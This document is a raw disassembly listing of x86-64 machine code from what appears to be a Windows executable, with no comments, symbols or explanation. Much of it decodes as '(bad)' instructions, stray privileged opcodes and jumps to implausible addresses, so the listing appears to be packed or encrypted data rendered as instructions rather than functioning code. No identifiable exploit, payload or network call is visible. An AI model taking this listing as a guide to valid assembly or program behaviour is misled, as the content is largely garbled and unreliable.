   14000db71:	03 38                	add    (%rax),%edi
   14000db73:	b8 1a 0e c1 ff       	mov    $0xffc10e1a,%eax
   14000db78:	db e3                	fninit
   14000db7a:	1f                   	(bad)
   14000db7b:	38 da                	cmp    %bl,%dl
   14000db7d:	81 48 27 42 58 08 95 	orl    $0x95085842,0x27(%rax)
   14000db84:	18 54 48 b7          	sbb    %dl,-0x49(%rax,%rcx,2)
   14000db88:	81 c3 12 68 28 08    	add    $0x8286812,%ebx
   14000db8e:	4c 24 68             	rex.WR and $0x68,%al
   14000db91:	78 a8                	js     0x14000db3b
   14000db93:	e9 e0 52 28 bd       	jmp    0xfd292e78
   14000db98:	84 1b                	test   %bl,(%rbx)
   14000db9a:	c0 26 c0             	shlb   $0xc0,(%rsi)
   14000db9d:	eb 78                	jmp    0x14000dc17
   14000db9f:	d9 f6                	fdecstp
   14000dba1:	02 b4 49 ed 5c b4 34 	add    0x34b45ced(%rcx,%rcx,2),%dh
   14000dba8:	14 18                	adc    $0x18,%al
   14000dbaa:	0c 9e                	or     $0x9e,%al
   14000dbac:	28 0f                	sub    %cl,(%rdi)
   14000dbae:	64 da 5d b0          	ficompl %fs:-0x50(%rbp)
   14000dbb2:	eb 1e                	jmp    0x14000dbd2
   14000dbb4:	e7 f0                	out    %eax,$0xf0
   14000dbb6:	39 b4 09 34 90 7f 57 	cmp    %esi,0x577f9034(%rcx,%rcx,1)
   14000dbbd:	23 dc                	and    %esp,%ebx
   14000dbbf:	dd f0                	(bad)
   14000dbc1:	e1 50                	loope  0x14000dc13
   14000dbc3:	bc 35 b6 66 d5       	mov    $0xd566b635,%esp
   14000dbc8:	cb                   	lret
   14000dbc9:	85 f6                	test   %esi,%esi
   14000dbcb:	dc ae 02 de c7 1b    	fsubrl 0x1bc7de02(%rsi)
   14000dbd1:	3c 64                	cmp    $0x64,%al
   14000dbd3:	a8 22                	test   $0x22,%al
   14000dbd5:	45                   	rex.RB
   14000dbd6:	48 83 c0 18          	add    $0x18,%rax
   14000dbda:	f6 22                	mulb   (%rdx)
   14000dbdc:	e0 28                	loopne 0x14000dc06
   14000dbde:	bf 4c 46 39 c3       	mov    $0xc339464c,%edi
   14000dbe3:	72 13                	jb     0x14000dbf8
   14000dbe5:	3c 6f                	cmp    $0x6f,%al
   14000dbe7:	9f                   	lahf
   14000dbe8:	e2 4d                	loop   0x14000dc37
   14000dbea:	8c 8b 52 08 49 24    	mov    %cs,0x24490852(%rbx)
   14000dbf0:	1c 0f                	sbb    $0xf,%al
   14000dbf2:	82                   	(bad)
   14000dbf3:	62 1a e1 41 83 15 e3 	vpmultishiftqb -0x3e7f501d(%rip),%zmm19,%zmm10{%k1}        # 0x101818be0
   14000dbfa:	af 80 c1 
   14000dbfd:	04 28                	add    $0x28,%al
   14000dbff:	41 39 f1             	cmp    %esi,%r9d
   14000dc02:	75 b0                	jne    0x14000dbb4
   14000dc04:	d9 fb                	fsincos
   14000dc06:	0b b8 e0 ce 24 12    	or     0x1224cee0(%rax),%edi
   14000dc0c:	89 c7                	mov    %eax,%edi
   14000dc0e:	48 cf                	iretq
   14000dc10:	1b 5e a4             	sbb    -0x5c(%rsi),%ebx
   14000dc13:	5f                   	pop    %rdi
   14000dc14:	c7                   	(bad)
   14000dc15:	9b dc 55 c9          	fcoml  -0x37(%rbp)
   14000dc19:	84 b6 48 c1 e3 9e    	test   %dh,-0x611c3eb8(%rsi)
   14000dc1f:	01 4a 78             	add    %ecx,0x78(%rdx)
   14000dc22:	20 14 fc             	and    %dl,(%rsp,%rdi,8)
   14000dc25:	50                   	push   %rax
   14000dc26:	00 6d 25             	add    %ch,0x25(%rbp)
   14000dc29:	9c                   	pushf
   14000dc2a:	8b 57 0c             	mov    0xc(%rdi),%edx
   14000dc2d:	a6                   	cmpsb  (%rdi),(%rsi)
   14000dc2e:	30 11                	xor    %dl,(%rcx)
   14000dc30:	78 2f                	js     0x14000dc61
   14000dc32:	1e                   	(bad)
   14000dc33:	9d                   	popf
   14000dc34:	0c 94                	or     $0x94,%al
   14000dc36:	05 27 5b 32 1c       	add    $0x1c325b27,%eax
   14000dc3b:	f6 df                	neg    %bh
   14000dc3d:	39 4c 18 18          	cmp    %ecx,0x18(%rax,%rbx,1)
   14000dc41:	ff 15 b7 78 00 00    	call   *0x78b7(%rip)        # 0x1400154fe
   14000dc47:	9b                   	fwait
   14000dc48:	43 8b 0c f4          	mov    (%r12,%r14,8),%ecx
   14000dc4c:	37                   	(bad)
   14000dc4d:	ed                   	in     (%dx),%eax
   14000dc4e:	6f                   	outsl  (%rsi),(%dx)
   14000dc4f:	a8 50                	test   $0x50,%al
   14000dc51:	c0 83 e2 bf 74 08 0e 	rolb   $0xe,0x874bfe2(%rbx)
   14000dc58:	fc                   	cld
   14000dc59:	fb                   	sti
   14000dc5a:	75 12                	jne    0x14000dc6e
   14000dc5c:	83 05 ef 65 00 0e e0 	addl   $0xffffffe0,0xe0065ef(%rip)        # 0x14e014252
   14000dc63:	e2 7a                	loop   0x14000dcdf
   14000dc65:	78 50                	js     0x14000dcb7
   14000dc67:	ec                   	in     (%dx),%al
   14000dc68:	f6 28                	imulb  (%rax)
   14000dc6a:	ab                   	stos   %eax,(%rdi)
   14000dc6b:	5a                   	pop    %rdx
   14000dc6c:	fe                   	(bad)
   14000dc6d:	7a 02                	jp     0x14000dc71
   14000dc6f:	90                   	nop
   14000dc70:	26 8b 8c fd 8a fb b4 	es mov 0x38b4fb8a(%rbp,%rdi,8),%ecx
   14000dc77:	38 
   14000dc78:	b8 40 b8 04 08       	mov    $0x804b840,%eax
   14000dc7d:	ca 44 c0             	lret   $0xc044
   14000dc80:	48 03 1d c5 6d 13 08 	add    0x8136dc5(%rip),%rbx        # 0x148144a4c
   14000dc87:	da 5c b8 4b          	ficompl 0x4b(%rax,%rdi,4)
   14000dc8b:	8e 5c 0c 53          	mov    0x53(%rsp,%rcx,1),%ds
   14000dc8f:	10 c4                	adc    %al,%ah
   14000dc91:	4c f1                	rex.WR int1
   14000dc93:	61                   	(bad)
   14000dc94:	fb                   	sti
   14000dc95:	3a 24 b6             	cmp    (%rsi,%rsi,4),%ah
   14000dc98:	12 ea                	adc    %dl,%ch
   14000dc9a:	77 ad                	ja     0x14000dc49
   14000dc9c:	23 47 87             	and    -0x79(%rdi),%eax
   14000dc9f:	80 6b 7a fe          	subb   $0xfe,0x7a(%rbx)
   14000dca3:	84 9c 7f 15 dc c1 8b 	test   %bl,-0x743e23eb(%rdi,%rdi,2)
   14000dcaa:	f6 7c 1a 64          	idivb  0x64(%rdx,%rbx,1)
   14000dcae:	38 8a 74 60 08 87    	cmp    %cl,-0x78f79f8c(%rdx)
   14000dcb4:	27                   	(bad)
   14000dcb5:	e8 f0 44 c8 36       	call   0x176c921aa
   14000dcba:	2f                   	(bad)
   14000dcbb:	44                   	rex.R
   14000dcbc:	42                   	rex.X
   14000dcbd:	4b d9 d4             	rex.WXB (bad)
   14000dcc0:	0e                   	(bad)
   14000dcc1:	0a 01                	or     (%rcx),%al
   14000dcc3:	fe                   	(bad)
   14000dcc4:	36 a7                	ss cmpsl (%rdi),(%rsi)
   14000dcc6:	1c 90                	sbb    $0x90,%al
   14000dcc8:	66 68 ff c1          	pushw  $0xc1ff
   14000dccc:	01 00                	add    %eax,(%rax)
   14000dcce:	55                   	push   %rbp
   14000dccf:	41 57                	push   %r15
   14000dcd1:	41 56                	push   %r14
   14000dcd3:	41 0a 54 f1 48       	or     0x48(%r9,%rsi,8),%dl
   14000dcd8:	a6                   	cmpsb  (%rdi),(%rsi)
   14000dcd9:	fa                   	cli
   14000dcda:	fd                   	std
   14000dcdb:	23 26                	and    (%rsi),%esp
   14000dcdd:	40                   	rex
   14000dcde:	44 8b 25 34 9a 45 85 	mov    -0x7aba65cc(%rip),%r12d        # 0xc5467719
   14000dce5:	e4 ae                	in     $0xae,%al
   14000dce7:	20 2b                	and    %ch,(%rbx)
   14000dce9:	80 ff c1             	cmp    $0xc1,%bh
   14000dcec:	65 08 76 41          	or     %dh,%gs:0x41(%rsi)
   14000dcf0:	5c                   	pop    %rsp
   14000dcf1:	41 5d                	pop    %r13
   14000dcf3:	41 5e                	pop    %r14
   14000dcf5:	41 5f                	pop    %r15
   14000dcf7:	2f                   	(bad)
   14000dcf8:	89 0e                	mov    %ecx,(%rsi)
   14000dcfa:	91                   	xchg   %eax,%ecx
   14000dcfb:	5d                   	pop    %rbp
   14000dcfc:	2e 0e                	cs (bad)
   14000dcfe:	65 ad                	lods   %gs:(%rsi),%eax
   14000dd00:	dc b6 f8 f4 dd ac    	fdivl  -0x53220b08(%rsi)
   14000dd06:	8d 04 80             	lea    (%rax,%rax,4),%eax
   14000dd09:	06                   	(bad)
   14000dd0a:	c5 0f d5             	(bad)
   14000dd0d:	e0 b5                	loopne 0x14000dcc4
   14000dd0f:	27                   	(bad)
   14000dd10:	3c b6                	cmp    $0xb6,%al
   14000dd12:	fb                   	sti
   14000dd13:	01 0b                	add    %ecx,(%rbx)
   14000dd15:	0a 2d bb 60 8b 1d    	or     0x1d8b60bb(%rip),%ch        # 0x15d8c3dd6
   14000dd1b:	c4                   	(bad)
   14000dd1c:	0c 66                	or     $0x66,%al
   14000dd1e:	de 64 f0 28          	fisubs 0x28(%rax,%rsi,8)
   14000dd22:	c0 31 79             	shlb   $0x79,(%rcx)
   14000dd25:	62 c4 9f 06 eb       	(bad)
   14000dd2a:	b8 8d f8 05 d3       	mov    $0xd305f88d,%eax
   14000dd2f:	24 8e                	and    $0x8e,%al
   14000dd31:	e8 22 f8 aa ed       	call   0x12dabd558
   14000dd36:	f7 0d 36 07 7e 90 8b 	testl  $0xb0e138b,-0x6f81f8ca(%rip)        # 0xd07ee476
   14000dd3d:	13 0e 0b 
   14000dd40:	0f 8f 7c 1d 94 c6    	jg     0x10694fac2
   14000dd46:	b1 af                	mov    $0xaf,%cl
   14000dd48:	02 0e                	add    (%rsi),%cl
   14000dd4a:	b8 d2 1e 8c 8b       	mov    $0x8b8c1ed2,%eax
   14000dd4f:	43 04 15             	rex.XB add $0x15,%al
   14000dd52:	15 57 df eb 53       	adc    $0x53ebdf57,%eax
   14000dd57:	08 4e 17             	or     %cl,0x17(%rsi)
   14000dd5a:	ca f6 0c             	lret   $0xcf6
   14000dd5d:	de eb                	fsubrp %st,%st(3)
   14000dd5f:	03 7c db c5          	add    -0x3b(%rbx,%rbx,8),%edi
   14000dd63:	0f 83 00 9d d8 35    	jae    0x175d97a69
   14000dd69:	7e ca                	jle    0x14000dd35
   14000dd6b:	49 bf e8 bc 0b 78 81 	movabs $0xeba47f81780bbce8,%r15
   14000dd72:	7f a4 eb 
   14000dd75:	54                   	push   %rsp
   14000dd76:	fe                   	(bad)
   14000dd77:	b6 37                	mov    $0x37,%dh
   14000dd79:	81 e1 e0 5f c7 6b    	and    $0x6bc75fe0,%ecx
   14000dd7f:	a6                   	cmpsb  (%rdi),(%rsi)
   14000dd80:	40 84 90 89 66 74 48 	rex test %dl,0x48746689(%rax)
   14000dd87:	81 ce 00 1c 2e f8    	or     $0xf82e1c00,%esi
   14000dd8d:	3f                   	(bad)
   14000dd8e:	2c 29                	sub    $0x29,%al
   14000dd90:	c6                   	(bad)
   14000dd91:	4c 01 ce             	add    %r9,%rsi
   14000dd94:	85 c9                	test   %ecx,%ecx
   14000dd96:	75 c2                	jne    0x14000dd5a
   14000dd98:	81 fe ff 19 7f f0    	cmp    $0xf07f19ff,%esi
   14000dd9e:	7b eb                	jnp    0x14000dd8b
   14000dda0:	e5 db                	in     $0xdb,%eax
   14000dda2:	a2 fe 80 0f 8c 13 89 	movabs %al,0x86f989138c0f80fe
   14000dda9:	f9 86 
   14000ddab:	1a 0c 40             	sbb    (%rax,%rax,2),%cl
   14000ddae:	88 37                	mov    %dh,(%rdi)
   14000ddb0:	76 45                	jbe    0x14000ddf7
   14000ddb2:	c1 6b cd 1d          	shrl   $0x1d,-0x33(%rbx)
   14000ddb6:	3c 28                	cmp    $0x28,%al
   14000ddb8:	8b 3e                	mov    (%rsi),%edi
   14000ddba:	8b 7b 04             	mov    0x4(%rbx),%edi
   14000ddbd:	7a 1e                	jp     0x14000dddd
   14000ddbf:	05 ad b5 f0 b8       	add    $0xb8f0b5ad,%eax
   14000ddc4:	d1 e8                	shr    $1,%eax
   14000ddc6:	08 10                	or     %dl,(%rax)
   14000ddc8:	f7 20                	mull   (%rax)
   14000ddca:	20 09                	and    %cl,(%rcx)
   14000ddcc:	07                   	(bad)
   14000ddcd:	ed                   	in     (%dx),%eax
   14000ddce:	b6 d7                	mov    $0xd7,%dh
   14000ddd0:	1d f4 4b 1d bc       	sbb    $0xbc1d4bf4,%eax
   14000ddd5:	1c 08                	sbb    $0x8,%al
   14000ddd7:	74 86                	je     0x14000dd5f
   14000ddd9:	08 10                	or     %dl,(%rax)
   14000dddb:	49 a9 8c bc e0 be    	rex.WB test $0xffffffffbee0bc8c,%rax
   14000dde1:	0f b7 05 66 85 5c 00 	movzwl 0x5c8566(%rip),%eax        # 0x1405d634e
   14000dde8:	07                   	(bad)
   14000dde9:	9b                   	fwait
   14000ddea:	7d 2e                	jge    0x14000de1a
   14000ddec:	1a 00                	sbb    (%rax),%al
   14000ddee:	80 20 f1             	andb   $0xf1,(%rax)
   14000ddf1:	1e                   	(bad)
   14000ddf2:	ff                   	(bad)
   14000ddf3:	3d 70 82 21 0a       	cmp    $0xa218270,%eax
   14000ddf8:	fb                   	sti
   14000ddf9:	13 66 50             	adc    0x50(%rsi),%esp
   14000ddfc:	3c 32                	cmp    $0x32,%al
   14000ddfe:	50                   	push   %rax
   14000ddff:	b2 0b                	mov    $0xb,%dl
   14000de01:	b8 1c ae 85 d0       	mov    $0xd085ae1c,%eax
   14000de06:	c9                   	leave
   14000de07:	11 f8                	adc    %edi,%eax
   14000de09:	8b 15 8e 63 fb 49    	mov    0x49fb638e(%rip),%edx        # 0x189fc419d
   14000de0f:	9d                   	popf
   14000de10:	6e                   	outsb  (%rsi),(%dx)
   14000de11:	2a 60 23             	sub    0x23(%rax),%ah
   14000de14:	ba 1b 76 24 6c       	mov    $0x6c24761b,%edx
   14000de19:	8d 7d fc             	lea    -0x4(%rbp),%edi
   14000de1c:	14 a3                	adc    $0xa3,%al
   14000de1e:	3b 03                	cmp    (%rbx),%eax
   14000de20:	4f 05 71 40 b6 a8    	rex.WRXB add $0xffffffffa8b64071,%rax
   14000de26:	1f                   	(bad)
   14000de27:	47 a7                	rex.RXB cmpsl (%rdi),(%rsi)
   14000de29:	2f                   	(bad)
   14000de2a:	a0 c0 74 0d 52 96 48 	movabs 0xf9c44896520d74c0,%al
   14000de31:	c4 f9 
   14000de33:	a1 f7 6f d3 ff d6 46 	movabs 0x1c446d6ffd36ff7,%eax
   14000de3a:	c4 01 
   14000de3c:	be 28 44 3b 25       	mov    $0x253b4428,%esi
   14000de41:	46                   	rex.RX
   14000de42:	4c 7c 8e             	rex.WR jl 0x14000ddd3
   14000de45:	30 b8 6d e8 8c 0f    	xor    %bh,0xf8ce86d(%rax)
   14000de4b:	1f                   	(bad)
   14000de4c:	a3 f1 da fa 0c 76 86 	movabs %eax,0xe40b86760cfadaf1
   14000de53:	0b e4 
   14000de55:	1b 1c 26             	sbb    (%rsi,%riz,1),%ebx
   14000de58:	15 42 1c 19 d0       	adc    $0xd0191c42,%eax
   14000de5d:	22 05 63 ff ca 40    	and    0x40caff63(%rip),%al        # 0x180cbddc6
   14000de63:	a4                   	movsb  (%rsi),(%rdi)
   14000de64:	37                   	(bad)
   14000de65:	e8 4d 27 48 9f       	call   0xdf4905b7
   14000de6a:	d7                   	xlat   (%rbx)
   14000de6b:	75 66                	jne    0x14000ded3
   14000de6d:	30 f6                	xor    %dh,%dh
   14000de6f:	78 61                	js     0x14000ded2
   14000de71:	48 07                	rex.W (bad)
   14000de73:	26 8f                	es (bad)
   14000de75:	7e b5                	jle    0x14000de2c
   14000de77:	f8                   	clc
   14000de78:	02 fa                	add    %dl,%bh
   14000de7a:	34 cf                	xor    $0xcf,%al
   14000de7c:	16                   	(bad)
   14000de7d:	ee                   	out    %al,(%dx)
   14000de7e:	6d                   	insl   (%dx),(%rdi)
   14000de7f:	c3                   	ret
   14000de80:	27                   	(bad)
   14000de81:	48 79 4c             	rex.W jns 0x14000ded0
   14000de84:	49 bb 93 63 dc 0b 8e 	movabs $0x94ce18e0bdc6393,%r11
   14000de8b:	e1 4c 09 
   14000de8e:	de 29                	fisubrs (%rcx)
   14000de90:	0f d6                	(bad)
   14000de92:	fe                   	(bad)
   14000de93:	7e bf                	jle    0x14000de54
   14000de95:	b8 2d 86 50 ec       	mov    $0xec50862d,%eax
   14000de9a:	06                   	(bad)
   14000de9b:	98                   	cwtl
   14000de9c:	7f b5                	jg     0x14000de53
   14000de9e:	1f                   	(bad)
   14000de9f:	08 dd                	or     %bl,%ch
   14000dea1:	42 80 06 03          	rex.X addb $0x3,(%rsi)
   14000dea5:	a1 df 2b 48 ed 00 1f 	movabs 0x2db61f00ed482bdf,%eax
   14000deac:	b6 2d 
   14000deae:	7d 74                	jge    0x14000df24
   14000deb0:	c1 eb ce             	shr    $0xce,%ebx
   14000deb3:	df 1f                	fistps (%rdi)
   14000deb5:	b5 0c                	mov    $0xc,%ch
   14000deb7:	df 8b 3d 02 44 1d    	fisttps 0x1d44023d(%rbx)
   14000debd:	1c 2f                	sbb    $0x2f,%al
   14000debf:	2f                   	(bad)
   14000dec0:	38 70 bc             	cmp    %dh,-0x44(%rax)
   14000dec3:	ee                   	out    %al,(%dx)
   14000dec4:	1c 7f                	sbb    $0x7f,%al
   14000dec6:	75 96                	jne    0x14000de5e
   14000dec8:	2f                   	(bad)
   14000dec9:	9b                   	fwait
   14000deca:	30 35 81 db 03 3f    	xor    %dh,0x3f03db81(%rip)        # 0x17f04ba51
   14000ded0:	4e 73 04             	rex.WRX jae 0x14000ded7
   14000ded3:	8b 3b                	mov    (%rbx),%edi
   14000ded5:	c4                   	(bad)
   14000ded6:	5a                   	pop    %rdx
   14000ded7:	f6 03 3e             	testb  $0x3e,(%rbx)
   14000deda:	a0 fb 0e 9e c1 06 3e 	movabs 0x724e3e06c19e0efb,%al
   14000dee1:	4e 72 
   14000dee3:	e3 9d                	jrcxz  0x14000de82
   14000dee5:	3c 84                	cmp    $0x84,%al
   14000dee7:	20 6f f2             	and    %ch,-0xe(%rdi)
   14000deea:	b4 ef                	mov    $0xef,%ah
   14000deec:	33 16                	xor    (%rsi),%edx
   14000deee:	ab                   	stos   %eax,(%rdi)
   14000deef:	e1 8b                	loope  0x14000de7c
   14000def1:	17                   	(bad)
   14000def2:	c3                   	ret
   14000def3:	3f                   	(bad)
   14000def4:	58                   	pop    %rax
   14000def5:	06                   	(bad)
   14000def6:	f5                   	cmc
   14000def7:	61                   	(bad)
   14000def8:	fc                   	cld
   14000def9:	0f 14 d3             	unpcklps %xmm3,%xmm2
   14000defc:	60                   	(bad)
   14000defd:	a4                   	movsb  (%rsi),(%rdi)
   14000defe:	0e                   	(bad)
   14000deff:	1c 66                	sbb    $0x66,%al
   14000df01:	25 32 84 83 2e       	and    $0x2e838432,%eax
   14000df06:	07                   	(bad)
   14000df07:	a0 03 39 8d 43 1a 8f 	movabs 0x81f48f1a438d3903,%al
   14000df0e:	f4 81 
   14000df10:	ed                   	in     (%dx),%eax
   14000df11:	28 0f                	sub    %cl,(%rdi)
   14000df13:	11 08                	adc    %ecx,(%rax)
   14000df15:	30 f2                	xor    %dh,%dl
   14000df17:	42                   	rex.X
   14000df18:	40 e7 58             	rex out %eax,$0x58
   14000df1b:	ef                   	out    %eax,(%dx)
   14000df1c:	44 c2 08 fe          	rex.R ret $0xfe08
   14000df20:	7e 76                	jle    0x14000df98
   14000df22:	d2 28                	shrb   %cl,(%rax)
   14000df24:	01 7f 59             	add    %edi,0x59(%rdi)
   14000df27:	b9 0c 9f 49 78       	mov    $0x78499f0c,%ecx
   14000df2c:	11 8b 02 47 ff c1    	adc    %ecx,-0x3e00b8fe(%rbx)
   14000df32:	b0 36                	mov    $0x36,%al
   14000df34:	89 c1                	mov    %eax,%ecx
   14000df36:	88 3c 20             	mov    %bh,(%rax,%riz,1)
   14000df39:	81 f9 43 43 47 03    	cmp    $0x3474343,%ecx
   14000df3f:	53                   	push   %rbx
   14000df40:	fb                   	sti
   14000df41:	fb                   	sti
   14000df42:	f6 1f                	negb   (%rdi)
   14000df44:	ec                   	in     (%dx),%al
   14000df45:	3d 96 5a c0 77       	cmp    $0x77c05a96,%eax
   14000df4a:	77 3d                	ja     0x14000df89
   14000df4c:	8b 0c 76             	mov    (%rsi,%rsi,2),%ecx
   14000df4f:	21 05 73 3c 3f 9e    	and    %eax,-0x61c0c38d(%rip)        # 0xde401bc8
   14000df55:	a3 08 3b 70 09 77 54 	movabs %eax,0xd0e2547709703b08
   14000df5c:	e2 d0 
   14000df5e:	33 6f bf             	xor    -0x41(%rdi),%ebp
   14000df61:	bf df dd 3d 05       	mov    $0x53ddddf,%edi
   14000df66:	4e 73 20             	rex.WRX jae 0x14000df89
   14000df69:	5c                   	pop    %rsp
   14000df6a:	76 3b                	jbe    0x14000dfa7
   14000df6c:	3d 08 18 74 29       	cmp    $0x29741808,%eax
   14000df71:	3d 1d 0c 75 34       	cmp    $0x34750c1d,%eax
   14000df76:	31 85 70 66 e0 d2    	xor    %eax,-0x2d1f9990(%rbp)
   14000df7c:	b9 04 1b 7c 48       	mov    $0x487c1b04,%ecx
   14000df81:	0f a4 f8 35          	shld   $0x35,%edi,%eax
   14000df85:	38 20                	cmp    %ah,(%rax)
   14000df87:	83 83 19 31 ff d0 39 	addl   $0x39,-0x2f00cee7(%rbx)
   14000df8e:	07                   	(bad)
   14000df8f:	57                   	push   %rdi
   14000df90:	e0 66                	loopne 0x14000dff8
   14000df92:	cc                   	int3
   14000df93:	5b                   	pop    %rbx
   14000df94:	c3                   	ret
   14000df95:	3d b8 80 74 ee       	cmp    $0xee7480b8,%eax
   14000df9a:	d4                   	(bad)
   14000df9b:	2a 33                	sub    (%rbx),%dh
   14000df9d:	40 e0 80             	rex loopne 0x14000df20
   14000dfa0:	61                   	(bad)
   14000dfa1:	29 cc                	sub    %ecx,%esp
   14000dfa3:	e4 37                	in     $0x37,%al
   14000dfa5:	bf 7a ba ec 48       	mov    $0x48ecba7a,%edi
   14000dfaa:	d8 e5                	fsub   %st(5),%st
   14000dfac:	f6 42 04 77          	testb  $0x77,0x4(%rdx)
   14000dfb0:	1f                   	(bad)
   14000dfb1:	4d eb 5e             	rex.WRB jmp 0x14000e012
   14000dfb4:	58                   	pop    %rax
   14000dfb5:	f6 84 c1 ff 7f 3f e8 	testb  $0x8,-0x17c08001(%rcx,%rax,8)
   14000dfbc:	08 
   14000dfbd:	b7 bd                	mov    $0xbd,%bh
   14000dfbf:	ee                   	out    %al,(%dx)
   14000dfc0:	48 ab                	stos   %rax,(%rdi)
   14000dfc2:	9f                   	lahf
   14000dfc3:	a4                   	movsb  (%rsi),(%rdi)
   14000dfc4:	31 e8                	xor    %ebp,%eax
   14000dfc6:	eb 89                	jmp    0x14000df51
   14000dfc8:	6f                   	outsl  (%rsi),(%dx)
   14000dfc9:	63 cf                	movsxd %edi,%ecx
   14000dfcb:	78 b1                	js     0x14000df7e
   14000dfcd:	4f 75 dc             	rex.WRXB jne 0x14000dfac
   14000dfd0:	b5 29                	mov    $0x29,%ch
   14000dfd2:	01 79 86             	add    %edi,-0x7a(%rcx)
   14000dfd5:	0f 62 1f             	punpckldq (%rdi),%mm3
   14000dfd8:	b9 7e 4e 0b f7       	mov    $0xf70b4e7e,%ecx
   14000dfdd:	3b 05 04 ba 61 1f    	cmp    0x1f61ba04(%rip),%eax        # 0x15f6299e7
   14000dfe3:	cb                   	lret
   14000dfe4:	31 ff                	xor    %edi,%edi
   14000dfe6:	d0 51 c9             	rclb   $1,-0x37(%rcx)
   14000dfe9:	6c                   	insb   (%dx),(%rdi)
   14000dfea:	20 b3 79 04 27 0b    	and    %dh,0xb270479(%rbx)
   14000dff0:	cf                   	iret
   14000dff1:	43 18 5b c9          	rex.XB sbb %bl,-0x37(%r11)
   14000dff5:	93                   	xchg   %eax,%ebx
   14000dff6:	31 22                	xor    %esp,(%rdx)
   14000dff8:	93                   	xchg   %eax,%ebx
   14000dff9:	b0 09                	mov    $0x9,%al
   14000dffb:	5f                   	pop    %rdi
   14000dffc:	9f                   	lahf
   14000dffd:	70 85                	jo     0x14000df84
   14000dfff:	01 fe                	add    %edi,%esi
   14000e001:	48                   	rex.W
   14000e002:	4c 8d 25 5f 60 b7 44 	lea    0x44b7605f(%rip),%r12        # 0x184b84068
   14000e009:	15 26 72 bf ed       	adc    $0xedbf7226,%eax
   14000e00e:	76 1d                	jbe    0x14000e02d
   14000e010:	09 2f                	or     %ebp,(%rdi)
   14000e012:	1e                   	(bad)
   14000e013:	fc                   	cld
   14000e014:	db 74 36 16          	(bad) 0x16(%rsi,%rsi,1)
   14000e018:	2d 6b 25 3d 14       	sub    $0x143d256b,%eax
   14000e01d:	c0 0d 7f 88 72 0f 8b 	rorb   $0x8b,0xf72887f(%rip)        # 0x14f7368a3
   14000e024:	0b ff                	or     %edi,%edi
   14000e026:	d5 60 c6             	{rex2 0x60} (bad)
   14000e029:	ff d7                	call   *%rdi
   14000e02b:	74 a2                	je     0x14000dfcf
   14000e02d:	7d aa                	jge    0x14000dfd9
   14000e02f:	d8 0e                	fmuls  (%rsi)
   14000e031:	74 74                	je     0x14000e0a7
   14000e033:	09 38                	or     %edi,(%rax)
   14000e035:	43 28 f1             	rex.XB sub %sil,%r9b
   14000e038:	87 13                	xchg   %edx,(%rbx)
   14000e03a:	dc 4f 50             	fmull  0x50(%rdi)
   14000e03d:	5b                   	pop    %rbx
   14000e03e:	10 6a c2             	adc    %ch,-0x3e(%rdx)
   14000e041:	94                   	xchg   %eax,%esp
   14000e042:	59                   	pop    %rcx
   14000e043:	84 1b                	test   %bl,(%rbx)
   14000e045:	0c 84                	or     $0x84,%al
   14000e047:	81 aa 25 08 72 d7 3e 	subl   $0x5fdc363e,-0x288df7db(%rdx)
   14000e04e:	36 dc 5f 
   14000e051:	20 ec                	and    %ch,%ah
   14000e053:	db 5f 9e             	fistpl -0x62(%rdi)
   14000e056:	cf                   	iret
   14000e057:	60                   	(bad)
   14000e058:	d6                   	udb
   14000e059:	80 1a ec             	sbbb   $0xec,(%rdx)
   14000e05c:	c0 86 0a ab e4 ba 18 	rolb   $0x18,-0x451b54f6(%rsi)
   14000e063:	61                   	(bad)
   14000e064:	01 68 1d             	add    %ebp,0x1d(%rax)
   14000e067:	16                   	(bad)
   14000e068:	4d 58                	rex.WRB pop %r8
   14000e06a:	89 c3                	mov    %eax,%ebx
   14000e06c:	97                   	xchg   %eax,%edi
   14000e06d:	33 0e                	xor    (%rsi),%ecx
   14000e06f:	70 14                	jo     0x14000e085
   14000e071:	ee                   	out    %al,(%dx)
   14000e072:	ba 1d 52 35 be       	mov    $0xbe35521d,%edx
   14000e077:	69 38 cb 15 83 71    	imul   $0x718315cb,(%rax),%edi
   14000e07d:	84 6f bb             	test   %ch,-0x45(%rdi)
   14000e080:	7b 9f                	jnp    0x14000e021
   14000e082:	22 1e                	and    (%rsi),%bl
   14000e084:	04 1d                	add    $0x1d,%al
   14000e086:	82                   	(bad)
   14000e087:	13 43 2b             	adc    0x2b(%rbx),%eax
   14000e08a:	25 fe 57 06 a0       	and    $0xa00657fe,%eax
   14000e08f:	34 eb                	xor    $0xeb,%al
   14000e091:	ac                   	lods   (%rsi),%al
   14000e092:	83 c8 ff             	or     $0xffffffff,%eax
   14000e095:	eb a9                	jmp    0x14000e040
   14000e097:	7f 43                	jg     0x14000e0dc
   14000e099:	c1 a0 33 8e 73 cb 59 	shll   $0x59,-0x348c71cd(%rax)
   14000e0a0:	7b b5                	jnp    0x14000e057
   14000e0a2:	ec                   	in     (%dx),%al
   14000e0a3:	7d e2                	jge    0x14000e087
   14000e0a5:	5b                   	pop    %rbx
   14000e0a6:	5e                   	pop    %rsi
   14000e0a7:	5f                   	pop    %rdi
   14000e0a8:	a8 69                	test   $0x69,%al
   14000e0aa:	85 6e 30             	test   %ebp,0x30(%rsi)
   14000e0ad:	6d                   	insl   (%dx),(%rdi)
   14000e0ae:	c5 95 fb a5 0d 39 1f 	vpsubq 0x221f390d(%rbp),%ymm13,%ymm4
   14000e0b5:	22 
   14000e0b6:	27                   	(bad)
   14000e0b7:	16                   	(bad)
   14000e0b8:	eb 0b                	jmp    0x14000e0c5
   14000e0ba:	30 ca                	xor    %cl,%dl
   14000e0bc:	66 5d                	pop    %bp
   14000e0be:	85 06                	test   %eax,(%rsi)
   14000e0c0:	01 1b                	add    %ebx,(%rbx)
   14000e0c2:	fe 8b 01 39 80 af    	decb   -0x507fc6ff(%rbx)
   14000e0c8:	c1 e6 f6             	shl    $0xf6,%esi
   14000e0cb:	41 10 75 eb          	adc    %sil,-0x15(%r13)
   14000e0cf:	22 d2                	and    %dl,%dl
   14000e0d1:	74 1e                	je     0x14000e0f1
   14000e0d3:	42 10 47 54          	rex.X adc %al,0x54(%rdi)
   14000e0d7:	77 78                	ja     0x14000e151
   14000e0d9:	25 ac 9d 2c b3       	and    $0xb32c9dac,%eax
   14000e0de:	4e f1                	rex.WRX int1
   14000e0e0:	5e                   	pop    %rsi
   14000e0e1:	38 48 94             	cmp    %cl,-0x6c(%rax)
   14000e0e4:	38 0c dd 7f fb 12 ee 	cmp    %cl,-0x11ed0481(,%rbx,8)
   14000e0eb:	2d 9c 78 a5 22       	sub    $0x22a5789c,%eax
   14000e0f0:	fc                   	cld
   14000e0f1:	77 30                	ja     0x14000e123
